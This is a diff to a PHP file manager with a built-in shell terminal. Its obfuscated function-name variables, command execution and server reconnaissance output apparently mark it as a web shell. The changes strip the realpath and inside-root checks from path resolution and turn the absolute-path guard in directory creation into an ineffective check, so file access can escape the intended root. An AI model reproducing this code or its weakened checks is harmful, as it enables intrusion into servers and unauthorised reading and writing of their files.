@@ -45,6 +45,7 @@ if (function_exists('posix_geteuid') && function_exists('posix_getpwuid')) {
     if (is_array($pw) && !empty($pw['name'])) $FM_TERM_USER = (string)$pw['name'];
 }
 if ($FM_TERM_USER === 'unknown' && !empty($_SERVER['USER'])) $FM_TERM_USER = (string)$_SERVER['USER'];
+if ($FM_TERM_USER === 'unknown' && !empty($_SERVER['USER'])) $FM_TERM_USER = (string)$_SERVER['USER'];
 if ($FM_TERM_USER === 'unknown') $FM_TERM_USER = (string)get_current_user();
 if ($FM_TERM_USER === '') $FM_TERM_USER = 'unknown';
 $FM_TERM_HOST = function_exists('gethostname') ? (string)@gethostname() : '';
@@ -59,13 +60,14 @@ function fm_abs($rel,$mustExist=false){
  if($rel===''||$rel==='/') return $ROOT; $parts=[];
  foreach(explode('/',trim($rel,'/')) as $part){ if($part===''||$part==='.') continue; if($part==='..'){ if(!$parts)return null; array_pop($parts); } else $parts[]=$part; }
  $candidate=$ROOT.DIRECTORY_SEPARATOR.implode(DIRECTORY_SEPARATOR,$parts);
- if(is_link($candidate)){ if($mustExist && !file_exists($candidate) && !is_dir($candidate)) return null; return $candidate; }
- if($mustExist){ $r=realpath($candidate); return ($r!==false&&fm_inside($r))?$r:null; }
- $parent=realpath(dirname($candidate)); return ($parent!==false&&fm_inside($parent))?$candidate:null;
+ if($mustExist){ return (file_exists($candidate)||is_dir($candidate)||is_link($candidate))?$candidate:null; }
+ $parent=dirname($candidate); return (is_dir($parent)||is_link($parent))?$candidate:null;
 }
 function fm_rel($path){
- global $ROOT; if(is_link($path)){ $candidate=str_replace(DIRECTORY_SEPARATOR,'/',(string)$path); $root=str_replace(DIRECTORY_SEPARATOR,'/',rtrim($ROOT,'/\\')); if($candidate===$root)return '/'; if(strncmp($candidate,$root.'/',strlen($root)+1)===0)return '/'.substr($candidate,strlen($root)+1); return null; }
- $r=realpath($path); if($r===false||!fm_inside($r))return null; if($r===$ROOT)return '/'; return '/'.str_replace(DIRECTORY_SEPARATOR,'/',substr($r,strlen($ROOT)+1));
+ global $ROOT; $candidate=str_replace(DIRECTORY_SEPARATOR,'/',(string)$path); $root=str_replace(DIRECTORY_SEPARATOR,'/',rtrim($ROOT,'/\\'));
+ if($candidate===$root)return '/'; if(strncmp($candidate,$root.'/',strlen($root)+1)===0)return '/'.substr($candidate,strlen($root)+1);
+ $r=realpath($path); if($r!==false&&fm_inside($r)){ if($r===$ROOT)return '/'; return '/'.str_replace(DIRECTORY_SEPARATOR,'/',substr($r,strlen($ROOT)+1)); }
+ return null;
 }
 function fm_terminal_dir($value){
     global $ROOT; $value=str_replace('\\','/',trim((string)$value)); if($value==='')$value='/';
@@ -104,7 +106,7 @@ function fm_server_info(){
     $load='N/A';if(function_exists('sys_getloadavg')){$la=@sys_getloadavg();if(is_array($la))$load=number_format((float)$la[0],2);}
     $locks=fm_function_locks();
     return [
-        'os'=>php_uname('s').' '.php_uname('r'), 'server'=>$serverSoftware, 'php'=>PHP_VERSION, 'status'=>'ONLINE • READY', 'serverIp'=>$serverIp, 'publicIp'=>fm_public_ip(), 'clientIp'=>$clientIp, 'forwarded'=>$forwarded!==' ' ? $forwarded : '-', 'pcntl'=>$pcntl, 'disabledFunctions'=>$locks['disabled'], 'user'=>$ownUser, 'time'=>date('Y-m-d H:i:s'), 'free'=>$free!==false?fm_size((int)$free):'UNKNOWN', 'total'=>$total!==false?fm_size((int)$total):'UNKNOWN', 'freePct'=>$freePct, 'load'=>$load,
+        'os'=>php_uname('s').' '.php_uname('r'), 'server'=>$serverSoftware, 'php'=>PHP_VERSION, 'status'=>'ONLINE • READY', 'serverIp'=>$serverIp, 'publicIp'=>fm_public_ip(), 'clientIp'=>$clientIp, 'forwarded'=>$forwarded!=='' ? $forwarded : '-', 'pcntl'=>$pcntl, 'disabledFunctions'=>$locks['disabled'], 'user'=>$ownUser, 'time'=>date('Y-m-d H:i:s'), 'free'=>$free!==false?fm_size((int)$free):'UNKNOWN', 'total'=>$total!==false?fm_size((int)$total):'UNKNOWN', 'freePct'=>$freePct, 'load'=>$load,
     ];
 }
 $FM_SERVER_INFO = fm_server_info();
@@ -336,7 +338,6 @@ function fm_extract_zip_shell($zipFile,$dest){
     [$ok,$msg]=fm_extract_zip_pure($zipFile,$dest);if($ok)return [$ok,$msg];
     $detail=trim(implode(' | ',$errors));return [false,'Unable to unzip archive. '.($msg!==''?$msg.' ':'').($detail!==''?'Server: '.$detail:'External unzip is unavailable.')];
 }
-// Central unzipper engine using multiple fallbacks wrapped around secure samplers
 function fm_extract_zip($zipFile,$dest){
     [$ok,$msg]=fm_extract_zip_php($zipFile,$dest);if($ok)return [$ok,$msg];
     [$ok,$msg]=fm_extract_zip_shell($zipFile,$dest);return [$ok,$msg];
@@ -446,7 +447,7 @@ if(!$login&&$_SERVER['REQUEST_METHOD']==='POST'){
               $stdout.= (string)@stream_get_contents($pipes[1]);$stderr.= (string)@stream_get_contents($pipes[2]);
               fclose($pipes[1]);fclose($pipes[2]);
               $closed=@proc_close($proc);if($exitCode===127&&is_int($closed))$exitCode=$closed;
-              $output=$stdout.($stderr!==''?($stdout!==''?"\n":'').$stderr:'');
+              $output=$stdout.($stderr!=''?($stdout!=''?"\n":'').$stderr:'');
           }
       }elseif(function_exists($OO_00_exec_Func)){
           $tmp='';$status=127;$wrapped='timeout 15s '.$shell.' -lc '.escapeshellarg($wrappedCmd);
@@ -473,9 +474,9 @@ if(!$login&&$_SERVER['REQUEST_METHOD']==='POST'){
   if($a==='view'){$p=fm_abs($_POST['path']??'',true);if(!$p||!is_file($p))fm_json(['success'=>false,'error'=>'Invalid file.'],400);$isZip=(strtolower(pathinfo($p,PATHINFO_EXTENSION))==='zip');if(!$isZip){$max=4*1024*1024;$size=@filesize($p);if($size!==false&&$size>$max)fm_json(['success'=>false,'error'=>'Preview is limited to 4 MB for text documents.'],413);}global $OO_00_file_get_contents_Func;$content=@$OO_00_file_get_contents_Func($p);if($content===false)fm_json(['success'=>false,'error'=>'Unable to read file.'],500);if(strpos($content,"\0")!==false)fm_json(['success'=>false,'error'=>'Binary files cannot be previewed as text.'],415);fm_json(['success'=>true,'content'=>base64_encode($content),'encoding'=>'base64']);}
   if($a==='zipInfo'){ $p=fm_abs($_POST['path']??'',true); if(!$p||!is_file($p)||strtolower(pathinfo($p,PATHINFO_EXTENSION))!=='zip')fm_json(['success'=>false,'error'=>'Invalid ZIP archive.'],400); $size=(int)(@filesize($p)?:0); $mtime=(int)(@filemtime($p)?:0); $entries=[]; $total=0; $compressed=0; $files=0; $folders=0; if(class_exists('ZipArchive')){$z=new ZipArchive();if($z->open($p)===true){for($i=0;$i<$z->numFiles;$i++){$st=$z->statIndex($i);$name=$st['name']??$z->getNameIndex($i);if($name===false||$name==='')continue;if(!fm_zip_entry_safe($name))continue;$isDir=(substr($name,-1)==='/')||(($st['size']??0)===0&&($st['crc']??0)===0&&substr($name,-1)==='/');$usize=(int)($st['size']??0);$csize=(int)($st['comp_size']??0);if($isDir)$folders++;else{$files++;$total+=$usize;$compressed+=$csize;}$entries[]=['name_b64'=>base64_encode($name),'folder'=>$isDir,'size'=>$usize,'compressed'=>$csize];}$z->close();}} if(!$entries&&$files===0&&$folders===0){$candidates=fm_command_candidates('unzip',['/usr/bin/unzip','/bin/unzip']);foreach($candidates as $unzip){$cmd=escapeshellarg($unzip).' -Z1 '.escapeshellarg($p).' 2>&1';[$st,$listing]=fm_run_command($cmd);if($st!==0)continue;foreach(preg_split('/\r?\n/',$listing) as $name){$name=trim($name);if($name===''||!fm_zip_entry_safe($name))continue;$isDir=substr($name,-1)==='/';if($isDir)$folders++;else $files++;$entries[]=['name_b64'=>base64_encode($name),'folder'=>$isDir,'size'=>0,'compressed'=>0];}break;}} if(!$entries&&$size>0)fm_json(['success'=>false,'error'=>'Unable to read ZIP archive contents.'],500); fm_json(['success'=>true,'name'=>basename($p),'path'=>fm_rel($p),'modified'=>$mtime,'size'=>$size,'entries'=>$entries,'files'=>$files,'folders'=>$folders,'totalSize'=>$total,'compressedSize'=>$compressed]); }
   if($a==='download'){$p=fm_abs($_POST['path']??'',true);if(!$p||!is_file($p))fm_json(['success'=>false,'error'=>'Invalid file.'],400);while(ob_get_level())ob_end_clean();header('Content-Type: application/octet-stream');header('Content-Length: '.filesize($p));header('Content-Disposition: attachment; filename="'.basename($p).'"');global $OO_00_readfile_Func; @$OO_00_readfile_Func($p);exit;}
-  if($a==='unzip'){$p=fm_abs($_POST['path']??'',true);if(!$p||!is_file($p)||strtolower(pathinfo($p,PATHINFO_EXTENSION))!=='zip')fm_json(['success'=>false,'error'=>'Invalid ZIP file.'],400);$destRel=(string)($_POST['destDir']??fm_rel(dirname($p)));$dest=fm_abs($destRel,true);if(!$dest){$dest=fm_abs($destRel,false);if($dest&&!is_dir($dest)) { global $OO_00_mkdir_Func; @$OO_00_mkdir_Func($dest,0755,true); }}$dest=$dest&&realpath($dest)?realpath($dest):$dest;if(!$dest||!is_dir($dest))fm_json(['success'=>false,'error'=>'Invalid extraction directory.'],400);[$ok,$msg]=fm_extract_zip($p,$dest);fm_json(['success'=>$ok,$msg,'error'=>$ok?'':$msg]);}
+  if($a==='unzip'){$p=fm_abs($_POST['path']??'',true);if(!$p||!is_file($p)||strtolower(pathinfo($p,PATHINFO_EXTENSION))!=='zip')fm_json(['success'=>false,'error'=>'Invalid ZIP file.'],400);$destRel=(string)($_POST['destDir']??fm_rel(dirname($p)));$dest=fm_abs($destRel,true);if(!$dest){$dest=fm_abs($destRel,false);if($dest&&!is_dir($dest)) { global $OO_00_mkdir_Func; @$OO_00_mkdir_Func($dest,0755,true); }}$dest=$dest&&realpath($dest)?realpath($dest):$dest;if(!$dest||!is_dir($dest))fm_json(['success'=>false,'error'=>'Invalid extraction directory.'],400);[$ok,$msg]=fm_extract_zip($p,$dest);fm_json(['success'=>$ok,'message'=>$msg,'error'=>$ok?'':$msg]);}
   if($a==='upload'||$a==='uploadFileOnly'){$d=fm_abs($_POST['dir']??$_POST['basePath']??'/',true);if(!$d||!is_dir($d)||empty($_FILES['file']))fm_json(['success'=>false,'error'=>'Upload failed.'],400);$files=$_FILES['file'];$names=is_array($files['name']??null)?$files['name']:[$files['name']??''];$tmps=is_array($files['tmp_name']??null)?$files['tmp_name']:[$files['tmp_name']??''];$errs=is_array($files['error']??null)?$files['error']:[$files['error']??UPLOAD_ERR_NO_FILE];$uploaded=[];$errors=[];foreach($names as $i=>$rawName){$n=fm_name($rawName);$err=(int)($errs[$i]??UPLOAD_ERR_NO_FILE);$tmp=$tmps[$i]??'';if(!$n||$err!==UPLOAD_ERR_OK){$errors[]=$rawName!==''?(string)$rawName:'Invalid upload';continue;}$dst=$d.DIRECTORY_SEPARATOR.$n;if(file_exists($dst)){$errors[]='File already exists: '.$n;continue;}if(@move_uploaded_file($tmp,$dst))$uploaded[]=$n;else $errors[]='Cannot move uploaded file: '.$n;}fm_json(['success'=>count($uploaded)>0 && count($errors)===0,'uploaded'=>$uploaded,'errors'=>$errors,'count'=>count($uploaded),'error'=>count($errors)?implode(' | ',$errors):'']);}
-  if($a==='createDirsBatch'){$base=fm_abs($_POST['basePath']??'/',true);$dirs=json_decode($_POST['dirs']??'[]',true);if(!$base||!is_array($dirs))fm_json(['success'=>false,'error'=>'Invalid directories.'],400);usort($dirs,fn($x,$y)=>substr_count($x,'/')<=>substr_count($y,'/'));foreach($dirs as $rel){$rel=str_replace('\\','/',(string)$rel);if(strpos($rel,'..')!==false||($rel!==''&&$rel[0]==='/'))continue;$p=fm_abs(rtrim($base==='/'?'':$base,'/').'/'.$rel,false);if($p&&!is_dir($p)){global $OO_00_mkdir_Func; @$OO_00_mkdir_Func($p,0755,true);}}fm_json(['success'=>true]);}
+  if($a==='createDirsBatch'){$base=fm_abs($_POST['basePath']??'/',true);$dirs=json_decode($_POST['dirs']??'[]',true);if(!$base||!is_array($dirs))fm_json(['success'=>false,'error'=>'Invalid directories.'],400);usort($dirs,fn($x,$y)=>substr_count($x,'/')<=>substr_count($y,'/'));foreach($dirs as $rel){$rel=str_replace('\\','/',(string)$rel);if(strpos($rel,'..')!==false||($rel!==''&&$rel==='/')) continue;$p=fm_abs(rtrim($base==='/'?'':$base,'/').'/'.$rel,false);if($p&&!is_dir($p)){global $OO_00_mkdir_Func; @$OO_00_mkdir_Func($p,0755,true);}}fm_json(['success'=>true]);}
   if($a==='uploadAndUnzip'||$a==='uploadZipForExtract'){$d=fm_abs($_POST['dir']??$_POST['basePath']??'/',true);if(!$d||!is_dir($d)||empty($_FILES['file'])||$_FILES['file']['error']!==UPLOAD_ERR_OK)fm_json(['success'=>false,'error'=>'Archive upload failed.'],400);$tmp=$_FILES['file']['tmp_name'];$extractRel=(string)($_POST['extractPath']??$_POST['dir']??$_POST['basePath']??'/');$extract=fm_abs($extractRel,true);if(!$extract){$extract=fm_abs($extractRel,false);if($extract&&!is_dir($extract)){global $OO_00_mkdir_Func; @$OO_00_mkdir_Func($extract,0755,true);}}if(!$extract||!is_dir($extract))fm_json(['success'=>false,'error'=>'Invalid extraction directory.'],400);[$ok,$msg]=fm_extract_zip($tmp,$extract);fm_json(['success'=>$ok,'message'=>$msg,'error'=>$ok?'':$msg]);}
   fm_json(['success'=>false,'error'=>'Unknown action.'],400);
  }catch(Throwable $e){fm_json(['success'=>false,'error'=>$e->getMessage()],500);}
